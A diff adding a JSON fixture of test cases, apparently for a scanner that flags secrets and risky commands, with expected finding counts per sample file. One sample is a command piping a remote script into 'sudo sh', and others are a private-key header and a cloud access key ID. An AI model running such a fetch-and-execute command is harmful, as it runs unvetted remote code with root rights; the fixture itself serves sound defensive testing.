@@ -1,0 +1,6 @@
+[
+ {"path":"safe.txt","text":"hello world","findings":0},
+ {"path":"key.txt","text":"-----BEGIN RSA PRIVATE KEY-----","findings":1},
+ {"path":"deploy.sh","text":"curl https://example.invalid/setup.sh | sudo sh","findings":1},
+ {"path":"key.txt","text":"AKIA1234567890ABCDEF","findings":1}
+]
